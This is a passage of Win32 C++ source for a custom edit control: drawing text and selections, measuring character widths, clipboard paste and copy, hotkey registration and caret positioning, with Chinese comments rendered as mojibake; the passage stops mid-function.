	void DrawEdits(int cur)//���������
	{//(ȫClass��ӵ�һ���ؼ�)
		RECT UPrc;
		int i, MOffset = 0, showBegin = 0, showEnd = 0;//�ṹʾ��:	��������dc -> ���Ʊ߿�(��ɫ or ��ɫ) -> ��ӡ����(��ʾ����)
		HDC mdc;//													->��ӡ����(δѡ��) ->��ӡ����(ѡ��) -> �ӻ���dc��ͼ -> ����
		mdc = CreateCompatibleDC(hdc);
		GetUpdateRect(hWnd, &UPrc, false);
		SelectObject(mdc, EditBitmap);//Editר��"������"Bitmap��dc
		SetBkMode(mdc, TRANSPARENT);
		if (cur != 0) { i = cur; goto begin; }//���ʹ��ObjectRedraw����������Edits

		for (i = 1; i <= CurEdit; ++i)
		{
		begin:
			if (Edit[i].Page == CurWnd || Edit[i].Page == 0)
			{
				if (UPrc.right != 0)if (UPrc.right > (long)((Edit[i].Left + Edit[i].Width) * DPI) &&
					UPrc.left< (long)(Edit[i].Left * DPI) && UPrc.bottom>(long)((Edit[i].Top + Edit[i].Height) * DPI)
					&& UPrc.top < (long)(Edit[i].Top * DPI))continue;
				SelectObject(mdc, WhitePen);//��ջ���dc
				SelectObject(mdc, WhiteBrush);
				Rectangle(mdc, 0, 0, MAX_EDIT_WIDTH, MAX_EDIT_HEIGHT);

				SelectObject(hdc, WhiteBrush);
				if (i == CoverEdit)SelectObject(hdc, NormalBluePen); else SelectObject(hdc, DarkGreyPen);//�����ǰEdit��ѡ��������ɫ���Ʊ߿�
				Rectangle(hdc, (int)((Edit[i].Left - 5) * DPI), (int)(Edit[i].Top * DPI),//�������Ĭ�ϵĺ�ɫ
					(int)((Edit[i].Left + Edit[i].Width + 5) * DPI), (int)((Edit[i].Top + Edit[i].Height) * DPI));

				if (*Edit[i].OStr != 0)//�����ǰEdit��ʾ����Ostr(��������ʾ�Ļ�ɫ����)
				{//��Hdc��ֱ�Ӵ�ӡ������
					SetTextColor(hdc, COLOR_DARKER_GREY);
					RECT rc{ (long)((Edit[i].Left - 5) * DPI) , (long)(Edit[i].Top * DPI),(long)((Edit[i].Left + Edit[i].Width + 5) * DPI),(long)((Edit[i].Top + Edit[i].Height) * DPI) };
					DrawTextW(hdc, Edit[i].OStr, (int)mywcslen(Edit[i].OStr), &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
					continue;
				}

				SIZE sel, ser;//pos1 / pos2:ȷ����ӡʱ"ѡ�в���"�������������˵�
				int pos1, pos2;//��Ϊ��ʱ��������ƶ����ѡ�����֣���ʱ��������
				if (Edit[i].Pos1 > Edit[i].Pos2 && Edit[i].Pos2 != -1)pos1 = Edit[i].Pos2, pos2 = Edit[i].Pos1; else pos1 = Edit[i].Pos1, pos2 = Edit[i].Pos2;
				//pos1&pos2���¼����ֵֻ��ʾѡ�е��Ⱥ�˳�򣬲��������ң��������Ҫ���⴦��

				if (Edit[i].font != NULL)SelectObject(mdc, Edit[i].font); else SelectObject(mdc, DefFont);//����
				if (Edit[i].XOffset != 0)
				{//��XOffset��Ϊ0ʱ�����ܴ󲿷����ֶ�������ʾ����Ļ�ϣ���ʱ���������豻��ӡ
					showBegin = max(MyGetTextExtentPoint32Binary(i, Edit[i].XOffset) - 1, 0);
					SIZE se;//��ȡ����ʾ����Ļ�ϵ����ֿ�ʼ���ͽ�β��
					MyGetTextExtentPoint32(i, -1, showBegin - 1, se);
					MOffset = se.cx;//��ȡMOffset(�����XOffset�������ƫ����)
					//��û������Ż�ʱ�������ϴ�ӡʱ���Ǵ�ӡ�����ַ�������ͼʱ��XOffset��ʼ��
					//����һ�Ż�ʱ����XOffset��Ϊ0����mdc�ϴ�ӡʱ�Ӻ�����0��ʼ��ӡ����ԭ������ƫ����(�ַ���ǰ��δ����ӡ���ַ��ĳ���)����λ��������ͼʱҲӦ������MOffset��λ.
					showEnd = min(MyGetTextExtentPoint32Binary(i, (int)(Edit[i].XOffset + Edit[i].Width * DPI)), Edit[i].strLength - 1);
				}
				if (pos2 == -1)
				{//���û��ѡ�У�ֱ�Ӵ�ӡ+��ͼ -> ����
					if (Edit[i].XOffset != 0)
						TextOutW(mdc, 0, 4, Edit[i].str + showBegin, showEnd - showBegin + 1);
					else
						TextOutW(mdc, 0, 4, Edit[i].str, Edit[i].strLength);
					goto next;
				}
				//���ѡ��:��Ϊ���ӵ����
				MyGetTextExtentPoint32(i, -1, pos1 - 1, sel);//ѡ��������ַ��ܳ���
				MyGetTextExtentPoint32(i, -1, pos2 - 1, ser);//ѡ��������+����ַ��ܳ���
				if (Edit[i].XOffset != 0)
				{//XOffset��Ϊ0��ʹ��MOffset�Ż������
					if (pos1 >= showBegin)
					{//ע��XOffset��Moffset���ǳ��Ϲ�DPI����ʵ����
						SetTextColor(mdc, COLOR_BLACK);
						TextOutW(mdc, 0, 4, Edit[i].str + showBegin, min(pos1, showEnd) - showBegin);//��ɫ��ӡѡ�����������
					}
					if (pos2 >= showBegin)
					{
						SelectObject(mdc, NormalBluePen);
						SelectObject(mdc, NormalBlueBrush);//����ɫ����ѡ��������
						Rectangle(mdc, max(sel.cx - MOffset, 0), 0, min(ser.cx - MOffset, int(Edit[i].XOffset + Edit[i].Width * DPI)), (int)(ser.cy + 5 * DPI));
						SetTextColor(mdc, COLOR_WHITE);
						TextOutW(mdc, max(sel.cx - MOffset, 0), 4, max(Edit[i].str + pos1, Edit[i].str + showBegin), min(pos2, showEnd) - max(pos1, showBegin) + 1);//��ɫ��ӡѡ�����м�����
					}
					if (pos2 <= showEnd)
					{
						SetTextColor(mdc, COLOR_BLACK);
						TextOutW(mdc, max(ser.cx - MOffset, 0), 4, max(Edit[i].str + pos2, Edit[i].str + showBegin), showEnd - max(pos2, showBegin) + 1);//��ɫ��ӡѡ�����ұ�����
					}
				}
				else
				{
					SelectObject(mdc, NormalBlueBrush);
					SelectObject(mdc, NormalBluePen);//����ɫ����ѡ��������
					Rectangle(mdc, sel.cx, 0, ser.cx, (int)(ser.cy + 5 * DPI));
					SetTextColor(mdc, COLOR_BLACK);
					TextOutW(mdc, 0, 4, Edit[i].str, pos1);//��ɫ��ӡѡ�����������
					SetTextColor(mdc, COLOR_WHITE);
					TextOutW(mdc, sel.cx, 4, &Edit[i].str[pos1], pos2 - pos1);//��ɫ��ӡѡ�����м�����
					SetTextColor(mdc, COLOR_BLACK);
					TextOutW(mdc, ser.cx, 4, &Edit[i].str[pos2], Edit[i].strLength - pos2);//��ɫ��ӡѡ�����ұ�����
				}
			next:
				int yMax = (int)((Edit[i].Top + Edit[i].Height / 2) * DPI - 4 - Edit[i].strHeight / 2);
				if (yMax < Edit[i].Top * DPI + 1)yMax = (int)(Edit[i].Top * DPI + 1);//��ͼ
				if (Edit[i].XOffset == 0)
					BitBlt(hdc, (int)((Edit[i].Left + Edit[i].Width / 2) * DPI) - Edit[i].strWidth / 2, yMax//XoffsetΪ0ʱ���д�ӡ
						, Edit[i].strWidth, Edit[i].strHeight + 4, mdc, 0, 0, SRCCOPY);
				else
					BitBlt(hdc, (int)(Edit[i].Left * DPI), yMax//��Xoffsetʱֱ�Ӹ���Xoffset-MOffset��ͼ
						, (int)(Edit[i].Width * DPI), Edit[i].strHeight + 4, mdc, Edit[i].XOffset - MOffset, 0, SRCCOPY);
			}
			if (cur != 0)goto end;
		}
	end:
		DeleteDC(mdc);
	}
	BOOL RedrawObject()//ObjectRedraw�����ķ��ɺ���
	{
		if (es[0].top != 0)//����es����������
		{
			SelectObject(hdc, WhitePen);
			SelectObject(hdc, WhiteBrush);
			for (int i = 1; i <= es[0].top; ++i)
				Rectangle(hdc, es[i].left, es[i].top, es[i].right, es[i].bottom);
			es[0].top = 0;
		}
		if (rs[0].first != 0)
		{
			for (int i = 1; i <= rs[0].first; ++i)
				switch (rs[i].first) {
				case REDRAW_FRAME:DrawFrames(rs[i].second); break;
				case REDRAW_BUTTON: {DrawButtons(rs[i].second); break; }
				case REDRAW_CHECK: {  DrawChecks(rs[i].second); break; }
				case REDRAW_TEXT: {DrawTexts(rs[i].second); break; }
				case REDRAW_EDIT: {DrawEdits(rs[i].second); break; }
				default:DrawExp();
				}
			rs[0].first = 0;
			return TRUE;
		}
		return FALSE;
	}
	void DrawEVERYTHING() { DrawFrames(0); DrawButtons(0); DrawChecks(0); DrawTexts(0);  DrawLines(); DrawEdits(0); DrawExp(); }//�Զ��������пؼ��ĺ�����Ч�ʵͣ���Ӧ����ʹ��
	RECT GetRECT(int cur)//����Buttons��rc �Դ�DPI����
	{
		return { (long)(Button[cur].Left * DPI), (long)(Button[cur].Top * DPI),
			(long)(Button[cur].Left * DPI + Button[cur].Width * DPI),(long)(Button[cur].Top * DPI + Button[cur].Height * DPI) };
	}
	RECT GetRECTf(int cur)//����Frames��rc �Դ�DPI����
	{
		return { (long)(Frame[cur].Left * DPI + 10 * DPI) ,(long)(Frame[cur].Top * DPI - 7 * DPI) ,
		(long)(Frame[cur].Left * DPI + Frame[cur].Width * DPI),(long)(Frame[cur].Top * DPI + 30 * DPI) };
	}
	RECT GetRECTe(int cur)//����Edit��rc �Դ�DPI����
	{
		return { (long)((Edit[cur].Left - 5) * DPI) ,(long)(Edit[cur].Top * DPI),
		(long)((Edit[cur].Left + Edit[cur].Width + 5) * DPI),(long)((Edit[cur].Top + Edit[cur].Height) * DPI) };
	}
	RECT GetRECTc(int cur)//����Check��rc �Դ�DPI����
	{
		return { (long)(Check[cur].Left * DPI) ,(long)(Check[cur].Top * DPI) ,
			(long)(Check[cur].Left * DPI + Check[cur].Width * DPI) ,(long)(Check[cur].Top * DPI + 15 * DPI) };
	}
	void RefreshEditSize(int cur)
	{//������Edit�����ݺ�ˢ��Edit�ַ��Ŀ��
		HDC mdc;
		HBITMAP bmp;//����һ����bmp����GetTextExtentPoint32(��ȡ�ַ����)
		mdc = CreateCompatibleDC(hdc);
		bmp = CreateCompatibleBitmap(hdc, 1, 1);
		SelectObject(mdc, bmp);//��������
		LOGFONTW Editfont;
		if (Edit[cur].font != NULL)SelectObject(mdc, Edit[cur].font), GetObject(Edit[cur].font, sizeof(LOGFONTW), &Editfont);
		else SelectObject(mdc, DefFont), GetObject(DefFont, sizeof(LOGFONTW), &Editfont);

		if (Edit[cur].strW != 0)HeapFree(GetProcessHeap(), 0, Edit[cur].strW);//ɾ���ɵĿ��
		Edit[cur].strW = (int*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(int) * (Edit[cur].strLength + 1));
		if (Edit[cur].strW == 0)return;
		SIZE se;
		GetTextExtentPoint32(mdc, Edit[cur].str, 1, &se);
		*Edit[cur].strW = se.cx;
		Edit[cur].strHeight = se.cy;
		for (int i = 1; i < Edit[cur].strLength; ++i)//���λ�ȡÿһλ�Ŀ��
		{//����GetTextExtentPoint32����Ч�ʳ���������������ﻮ��64k�ڴ潨��һ�����
			int curstr = *(Edit[cur].str + i);//��¼ÿ���ַ�������Ϊ16��ʱ�Ŀ�ȣ�
			if (strWmap[curstr] == 0)//������ÿ���ַ���һ���õ�ʱʹ��GetTextExtentPoint32��֮���������
			{//����ȱ����������ĿEdit��ֻ����ͬһ�����壨��������,���壩,�����л������С���ǿ��Ե�
				GetTextExtentPoint32(mdc, Edit[cur].str + i, 1, &se);
				Edit[cur].strW[i] = Edit[cur].strW[i - 1] + se.cx;
				Edit[cur].strHeight = max(Edit[cur].strHeight, se.cy);
				strWmap[curstr] = (byte)(se.cx * 8 / Editfont.lfWidth);
				if (strWmap[curstr] == 0)strWmap[curstr] = 255;
			}
			else
			{
				if (strWmap[curstr] == 255)
					Edit[cur].strW[i] = Edit[cur].strW[i - 1];
				else//strW�ĵ�iλָ���ǵ�0λ����iλ�Ŀ��֮��
					Edit[cur].strW[i] = Edit[cur].strW[i - 1] + (strWmap[curstr] * Editfont.lfWidth / 8);
				Edit[cur].strHeight = Editfont.lfHeight;//strHeight�Ǹ߶ȵ����ֵ
			}
		}
		DeleteDC(mdc);
		DeleteObject(bmp);
	}
	void SetEditStrOrFont(LPCWSTR Newstr, HFONT font, int cur)//�ı�ָ��Edit�����������
	{
		if (font != NULL) Edit[cur].font = font;//������font����Ϊ���ֿ�Ⱥ������й�

		if (Newstr != NULL)//�ı�����
		{

			Edit[cur].OStr[0] = 0;
			if (Edit[cur].str != NULL)if (*Edit[cur].str != NULL)HeapFree(GetProcessHeap(), 0, Edit[cur].str);
			Edit[cur].strLength = (int)mywcslen(Newstr);

			Edit[cur].str = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, (Edit[cur].strLength + 1) * sizeof(wchar_t));
			mywcscpy(Edit[cur].str, Newstr);
		}
		if (Edit[cur].str == 0) { Edit[cur].strWidth; return; }
		RefreshEditSize(cur);//ˢ���ַ������
		Edit[cur].strWidth = Edit[cur].strW[Edit[cur].strLength - 1];
		if ((int)(Edit[cur].Width * DPI) < Edit[cur].strWidth) {
			if (Edit[cur].XOffset == 0)Edit[cur].XOffset = (int)(Edit[cur].strWidth - Edit[cur].Width * DPI) / 2;
		}
		else Edit[cur].XOffset = 0;
	}
	int GetNearestChar(int cur, POINT Point)//���Ż�ȡ�����������������ַ�
	{//PointΪ��������ʵ����(���ź�����)
		POINT point;
		if (Edit[cur].strWidth <= Edit[cur].Width * DPI)//����ַ�����û������
		{//����������ʵ����ת��ΪEdit�е�����
			if (Point.x < (long)((Edit[cur].Left + Edit[cur].Width / 2) * DPI - Edit[cur].strWidth / 2))return 0;
			if (Point.x > (long)((Edit[cur].Left + Edit[cur].Width / 2) * DPI + Edit[cur].strWidth / 2))return Edit[cur].strLength;
			point.x = Point.x - (long)((Edit[cur].Left + Edit[cur].Width / 2) * DPI) + Edit[cur].strWidth / 2;
		}
		else//��ֱ֮����XOffset����
			point.x = (long)(Point.x - (long)(Edit[cur].Left * DPI) + Edit[cur].XOffset);
		const int pos = MyGetTextExtentPoint32Binary(cur, point.x);//��ȡ����point.x�ĵ�һ���ַ�
		SIZE sel, ser;
		MyGetTextExtentPoint32(cur, -1, pos - 1, sel);//����ǰһ���ַ����
		MyGetTextExtentPoint32(cur, -1, pos, ser);//�����һ��
		if (point.x < (sel.cx + ser.cx) / 2)return pos; else return pos + 1;//�ж���ѡ�й����߻����ұߵ��ַ�
	}
	void EditPaste(int cur)//��������������ճ����Edit�еĺ���
	{
		if (cur == 0 || CoverEdit == 0)return;//���û��ѡ��Edit���˳� ��һ�㲻��������������......�ɣ�
		if (OpenClipboard(hWnd))
		{//�򿪼��а�
			HANDLE hData = GetClipboardData(CF_TEXT);
			if (hData == 0)return;//������а��и�ʽ����CF_TEXT�����ʧ�ܲ��˳�
			char* buffer = (char*)GlobalLock(hData);
			if (buffer == 0)return;
			const size_t len = strlen(buffer), len2 = Edit[cur].strLength + 1;//��Ϊ��δ���ֻ��ճ������
			wchar_t* ClipBoardTemp = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(wchar_t) * (len + 1)),
				* EditTemp = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(wchar_t) * (len + len2));
			if (ClipBoardTemp == 0 || EditTemp == 0)return;
			MultiByteToWideChar(CP_ACP, 0, buffer, -1, ClipBoardTemp, (int)(len + 1));
			GlobalUnlock(hData);
			CloseClipboard();

			int pos1 = min(Edit[cur].Pos1, Edit[cur].Pos2), pos2 = max(Edit[cur].Pos1, Edit[cur].Pos2);
			if (pos1 == -1)
			{//���ֻ�е����ѡ��
				const wchar_t t = Edit[cur].str[pos2];
				Edit[cur].str[pos2] = 0;
				mywcscpy(EditTemp, Edit[cur].str);
				mywcscat(EditTemp, ClipBoardTemp);
				Edit[cur].str[pos2] = t;//�ڹ����������а����ַ���ƴ��
				mywcscat(EditTemp, &Edit[cur].str[pos2]);
				Edit[cur].Pos1 += (int)mywcslen(ClipBoardTemp);
				HeapFree(GetProcessHeap(), 0, ClipBoardTemp);
				SetEditStrOrFont(EditTemp, 0, cur);
				RefreshXOffset(cur);
				RefreshCaretByPos(cur);
			}
			else//ѡ������
			{
				Edit[cur].str[pos1] = 0;
				mywcscpy(EditTemp, Edit[cur].str);
				mywcscat(EditTemp, ClipBoardTemp);//��ѡ�񲿷��滻�ɼ��а����ַ���ƴ��
				mywcscat(EditTemp, &Edit[cur].str[pos2]);
				Edit[cur].Pos1 += (int)mywcslen(ClipBoardTemp); HeapFree(GetProcessHeap(), 0, ClipBoardTemp);
				Edit[cur].Pos2 = -1;
				SetEditStrOrFont(EditTemp, 0, cur);
				RefreshXOffset(cur);
				RefreshCaretByPos(cur);
			}
			HeapFree(GetProcessHeap(), 0, EditTemp);//�����ڴ�
			EditRedraw(cur);//�ػ�ؼ�
		}
	}
	void EditHotKey(int wParam)//Edit�����ȼ�ʱ�ķ��ɺ���
	{
		if (CoverEdit == 0)return;//���û��ѡ��Edit���˳� 
		switch (wParam)
		{
		case 34:EditMove(CoverEdit, -1); break;//<-��
		case 35:EditMove(CoverEdit, 1); break;//->��
		case 36:EditPaste(CoverEdit); break;//ճ��
		case 37:EditCopy(CoverEdit); break;//����
		case 38://����
			if (Edit[CoverEdit].Pos2 != -1)
				EditCopy(CoverEdit),//������ʵ���ȸ�����ɾ��
				EditDelete(CoverEdit, min(Edit[CoverEdit].Pos1, Edit[CoverEdit].Pos2),
					max(Edit[CoverEdit].Pos1, Edit[CoverEdit].Pos2));
			break;
		case 39:EditAll(CoverEdit); break;//ȫѡ
		case 40://Delete��������Backspace!��
			if (Edit[CoverEdit].strLength == Edit[CoverEdit].Pos1)break;
			const int pos1 = Edit[CoverEdit].Pos1, pos2 = Edit[CoverEdit].Pos2;
			if (pos2 != -1)//Backspace��ֱ������WM_CHAR������
				EditDelete(CoverEdit, min(pos1, pos2), max(pos1, pos2));
			else EditDelete(CoverEdit, pos1, pos1 + 1);
			break;
		}
		return;
	}
	void EditUnHotKey()//ȡ��ע��Edit���ȼ�
	{//�ڵ��һ��Edit�ⲿʱ�Զ�ִ��
		for (int i = 34; i < 41; ++i)AutoUnregisterHotKey(hWnd, i);
		HideCaret(hWnd);//������˸�Ĺ��
	}
	void EditRegHotKey()//ע��Edit���ȼ�
	{//�ڵ��һ��Editʱ�Զ�ִ��
		AutoRegisterHotKey(hWnd, 34, NULL, VK_LEFT);//<-
		AutoRegisterHotKey(hWnd, 35, NULL, VK_RIGHT);//->
		AutoRegisterHotKey(hWnd, 36, MOD_CONTROL, 'V');//ճ��
		AutoRegisterHotKey(hWnd, 37, MOD_CONTROL, 'C');//����
		AutoRegisterHotKey(hWnd, 38, MOD_CONTROL, 'X');//����
		AutoRegisterHotKey(hWnd, 39, MOD_CONTROL, 'A');//ȫѡ
		AutoRegisterHotKey(hWnd, 40, NULL, VK_DELETE);//Delete��
		DestroyCaret();//�ڵ���ĵط�������˸�Ĺ��
		CreateCaret(hWnd, NULL, 1, (int)(20 * DPI));
	}
	void EditCHAR(wchar_t wParam)//����
	{
		if (Edit[CoverEdit].Press == TRUE || CoverEdit == 0)return;//û��ѡ��Edit����갴��ʱ�˳�
		if (wParam >= 0x20 && wParam != 0x7F)//�����µ�����������ʱ:
		{
			const int pos = min(Edit[CoverEdit].Pos1, Edit[CoverEdit].Pos2);
			const int pos2 = max(Edit[CoverEdit].Pos1, Edit[CoverEdit].Pos2);
			if (pos == -1)//û��ѡ������(����)
				EditAdd(CoverEdit, pos2, pos2, wParam);
			else//ѡ����һ������(�滻)
				EditAdd(CoverEdit, pos, pos2, wParam);
		}
		else if (wParam == VK_BACK)//Backspace��
		{
			const int pos1 = Edit[CoverEdit].Pos1, pos2 = Edit[CoverEdit].Pos2;
			if (pos2 != -1)//ɾ������ǰһ������
				EditDelete(CoverEdit, min(pos1, pos2), max(pos1, pos2));
			else//ɾ��ѡ�е�һ������
				EditDelete(CoverEdit, pos1 - 1, pos1);
		}
		return;
	}
	void EditAdd(int cur, int Left, int Right, wchar_t Char)//��ĳ��Edit�����һ���ַ� �� ��һ���ַ��滻��һ���ַ�
	{//�����Left&Right���ַ�λ�ö���������
		const int len = Edit[cur].strLength + 5;//����ԭEdit�����ֵĳ���
		wchar_t* Tempstr = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, sizeof(wchar_t) * len), t = 0;//�����Ӧ���ȵĻ���ռ�
		if (Edit[cur].str == 0)Edit[cur].str = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(wchar_t) * len);
		if (Tempstr == 0 || Edit[cur].str == 0)return;

		if (Left == Right)t = Edit[cur].str[Left];//���ֻ������ַ������ȱ��ݹ���Ҳ���ַ�

		Edit[cur].str[Left] = 0;

		mywcscpy(Tempstr, Edit[cur].str);//��������������ַ����Ƶ�������
		Tempstr[Left] = Char;
		Tempstr[Left + 1] = 0;
		Edit[cur].str[Left] = t;//����µ��ַ�
		mywcscat(Tempstr, Edit[cur].str + Right);

		Edit[cur].Pos1 = Left + 1;//���Ҳ���ַ��ٽ���ȥ
		Edit[cur].Pos2 = -1;
		myZeroMemory(Edit[cur].str, sizeof(wchar_t) * mywcslen(Edit[cur].str));
		SetEditStrOrFont(Tempstr, 0, cur);//ˢ��
		HeapFree(GetProcessHeap(), 0, Tempstr);
		RefreshXOffset(cur);
		RefreshCaretByPos(cur);
		EditRedraw(cur);
	}
	void EditDelete(int cur, int Left, int Right)//ɾ��һ����һ���ַ�
	{
		if (Left == -1)return;//������߻�����BackSpace ?
		wchar_t* Tempstr = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, sizeof(wchar_t) * Edit[cur].strLength);
		if (Tempstr == 0)return;
		Edit[cur].str[Left] = 0;
		mywcscpy(Tempstr, Edit[cur].str);
		mywcscat(Tempstr, Edit[cur].str + Right);
		Edit[cur].Pos1 = Left;
		Edit[cur].Pos2 = -1;
		SetEditStrOrFont(Tempstr, 0, cur);
		HeapFree(GetProcessHeap(), 0, Tempstr);
		RefreshXOffset(cur);//ˢ��
		RefreshCaretByPos(cur);
		EditRedraw(cur);
	}
	void EditAll(int cur)//ѡ��һ��Edit�������ַ�
	{
		if (cur == 0)return;//δѡ���κ�Edit
		Edit[cur].Pos1 = 0;
		Edit[cur].Pos2 = Edit[cur].strLength;
		RefreshXOffset(cur);
		RefreshCaretByPos(cur);
		EditRedraw(cur);//ˢ��
	}

	void EditMove(int cur, int offset)//�ƶ�ѡ�е�Edit�й���λ��
	{//offset����Ϊ��
		int xback;//offsetҲ���Բ��ǡ�1
		xback = Edit[cur].XOffset;
		if (Edit[cur].Pos2 != -1)return;
		Edit[cur].Pos1 += offset;
		if (Edit[cur].Pos1 < 0)Edit[cur].Pos1 = 0;
		if (Edit[cur].Pos1 > Edit[cur].strLength)Edit[cur].Pos1 = Edit[cur].strLength;
		RefreshXOffset(cur);
		RefreshCaretByPos(cur);
	}

	void EditCopy(int cur)//����һ��Edit����ѡ�е�����
	{
		if (cur == 0)return;
		wchar_t* EditStr, t;
		char* ClipBoardStr;
		if (Edit[cur].Pos2 == -1)return;
		const int pos1 = min(Edit[cur].Pos1, Edit[cur].Pos2);
		const int pos2 = max(Edit[cur].Pos1, Edit[cur].Pos2);
		EditStr = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, sizeof(wchar_t) * (pos2 - pos1 + 1));//��һ�δ����EditPaste����
		ClipBoardStr = (char*)HeapAlloc(GetProcessHeap(), 0, sizeof(char) * (pos2 - pos1 + 1) * 2);//(��ʱ)�Ͳ�������
		if (EditStr == 0 || ClipBoardStr == 0)return;
		t = Edit[cur].str[pos2];
		Edit[cur].str[pos2] = 0;
		mywcscpy(EditStr, Edit[cur].str + pos1);
		Edit[cur].str[pos2] = t;
		WideCharToMultiByte(CP_ACP, 0, EditStr, -1, ClipBoardStr, (pos2 - pos1 + 1) * 2, NULL, NULL);

		if (OpenClipboard(hWnd))
		{
			char* buffer;
			EmptyClipboard();
			HGLOBAL clipbuffer = GlobalAlloc(GMEM_DDESHARE, strlen(ClipBoardStr) + 1);
			if (!clipbuffer)return;
			buffer = (char*)GlobalLock(clipbuffer);
			if (buffer != NULL)strcpy(buffer, LPCSTR(ClipBoardStr));
			GlobalUnlock(clipbuffer);
			SetClipboardData(CF_TEXT, clipbuffer);
			CloseClipboard();
		}
		HeapFree(GetProcessHeap(), 0, EditStr);
		HeapFree(GetProcessHeap(), 0, ClipBoardStr);
	}
	void MyGetTextExtentPoint32(int cur, int start, int end, SIZE& se)
	{//���ƻ�ȡ�ַ�����ȵĺ���
		if (*Edit[cur].OStr != 0)return;//��������ʾ�ַ������˳�
		if (start == -1)//��¼������0λʱ��1���ַ��Ŀ��
		{//����ӵ�1���ַ���߿�ʼ��ȡ����startӦΪ-1
			if (end == -1)se.cx = 0; else se.cx = Edit[cur].strW[end];
		}//Ȼ������[]����Ϊ-1������Ҫ���⴦��
		else se.cx = Edit[cur].strW[end] - Edit[cur].strW[start];
		se.cy = Edit[cur].strHeight;
	}

	int MyGetTextExtentPoint32Binary(int cur, int point)
	{//ͨ�����ֲ��ң���ȡָ��Edit�п�ȴ���search�ĵ�һ���ַ�λ��
		int left = 0, right = Edit[cur].strLength - 1, mid;
		while (right >= left)//ѭ��ֱ������ָ�뽻��(�Ҳ���)
		{
			mid = (left + right) >> 1;//��=(��+��)/2
			if (Edit[cur].strW[mid] < point)left = mid + 1;//����point���ʱ�����Ҷ���
			if (Edit[cur].strW[mid] >= point)//����point�ұ�
			{//��mid-1��point���->�ҵ���->�˳�
				if (Edit[cur].strW[mid - 1] < point)return mid;
				else
					right = mid - 1;//̫���ұ�->�������
			}
		}
		if (left == 0)return 0; else return Edit[cur].strLength - 1;//�Ҳ���->�������� or ����
	}

	void RefreshCaretByPos(int cur)//ˢ��ѡ�е�Edit�й���λ��
	{
		if (Edit[cur].Pos1 == -1)return;//ָ��Editδ��ѡ��->�˳�
		if (Edit[cur].strLength == 0) {
			CaretPos.x = (long)((Edit[cur].Left + Edit[cur].Width / 2) * DPI), CaretPos.y = (int)((Edit[cur].Top + Edit[cur].Height / 2 - 4) * DPI - 6 * DPI);
			goto finish;
		}
		SIZE se;//ͨ�����Edit��Pos1���ַ��������ַ�����
		if (Edit[cur].Pos2 != -1)
			MyGetTextExtentPoint32(cur, -1, Edit[cur].Pos2 - 1, se);
		else
			MyGetTextExtentPoint32(cur, -1, Edit[cur].Pos1 - 1, se);
		if (Edit[cur].XOffset == 0)//��ȥXoffset���ټ���Edit��������ǹ��λ����
			CaretPos.x = se.cx + (long)((Edit[cur].Left + Edit[cur].Width / 2) * DPI) - Edit[cur].strWidth / 2, CaretPos.y = (int)((Edit[cur].Top + Edit[cur].Height / 2 - 4) * DPI - Edit[cur].strHeight / 2);
		else
			CaretPos.x = (long)(se.cx + (long)(Edit[cur].Left * DPI) - Edit[cur].XOffset), CaretPos.y = (int)((Edit[cur].Top + Edit[cur].Height / 2 - 4) * DPI - Edit[cur].strHeight / 2);
	finish:
		SetCaretPos(CaretPos.x, CaretPos.y);
		ShowCaret(hWnd); ShowCrt = TRUE;
	}
	void EditDown(int cur)//��������ĳ��Edit�ϰ���
	{
		EditRegHotKey();//��ע�����ȼ���˵
		if (CoverEdit != cur)Edit[CoverEdit].Pos1 = Edit[CoverEdit].Pos2 = -1, EditRedraw(CoverEdit);//���ֱ�Ӵ�һ��Edit�㵽
		CoverEdit = cur;//														��һ��Edit����ô�Ȱ�֮ǰ��Pos��������������
		if (*Edit[cur].OStr != 0)//ȥ����ɫ����ʾ����
		{
			*Edit[cur].OStr = 0;
			myZeroMemory(Edit[cur].str, sizeof(wchar_t) * mywcslen(Edit[cur].str));
		}
		Edit[cur].Pos1 = Edit[cur].Pos2 = -1;
		Edit[cur].Press = TRUE;
		Edit[cur].Pos1 = GetNearestChar(cur, GetPos());//����Pos1

		RefreshCaretByPos(cur);//���� ��˸�Ĺ�� ��λ��
		EditRedraw(cur);//�ػ����Edit
	}

	BOOL InsideArea(int cur, POINT& point)//ͨ��POINT�ж��Ƿ���ָ��Area��
	{//POINTΪ�����ʵ����
		return (Area[cur].Left * DPI <= point.x) && (Area[cur].Top * DPI <= point.y) &&
			((Area[cur].Left + Area[cur].Width) * DPI >= point.x) && ((Area[cur].Top + Area[cur].Height) * DPI >= point.y);
	}

	BOOL InsideEdit(int cur, POINT& point)//ͨ��POINT�ж��Ƿ���ָ��Edit��
	{//POINTΪ�����ʵ����
		return ((Edit[cur].Left - 5) * DPI <= point.x && Edit[cur].Top * DPI <= point.y &&
			(long)((Edit[cur].Left + Edit[cur].Width + 5) * DPI) >= point.x && (Edit[cur].Top + Edit[cur].Height) * DPI >= point.y);
	}
	POINT GetPos()//��ȡ�������ĺ���
	{//������GetCursorPosҪ3�У�GetPos()��1��(�����ٶ�����)
		POINT point;
		GetCursorPos(&point);
		ScreenToClient(hWnd, &point);
		return point;
	}
	void EditComposition()//ΪEdit�������뷨��ʾλ�á�
	{
		POINT point = GetPos();
		LOGFONT lf;
		COMPOSITIONFORM cf;
		HIMC himc = ImmGetContext(hWnd);
		if (himc)
		{
			GetCaretPos(&point);
			cf.dwStyle = CFS_POINT;
			cf.ptCurrentPos.y = point.y + 10;
			cf.ptCurrentPos.x = point.x + 10;
			ImmSetCompositionWindow(himc, &cf);

			//�������뷨������ʽ(�ܶ�ʱ��û��)
			GetObject(DefFont, sizeof(LOGFONT), &lf);
			ImmSetCompositionFont(himc, &lf);

			ImmReleaseContext(hWnd, himc);
		}
	}
	void LeftButtonUp()//������̧��
	{
		if (CoverButton != -1)
		{
			Press = 0;//ȡ�������°�ť����ɫ
			ButtonRedraw(CoverButton);
		}
		Edit[CoverEdit].Press = FALSE;
	}
	inline void LeftButtonUp2()//������̧��(λ��WM_LBUTTONUP��Ϣ�����ִ��)
	{
		if (CoverCheck != 0)//����Check��ֵ���ػ�
		{
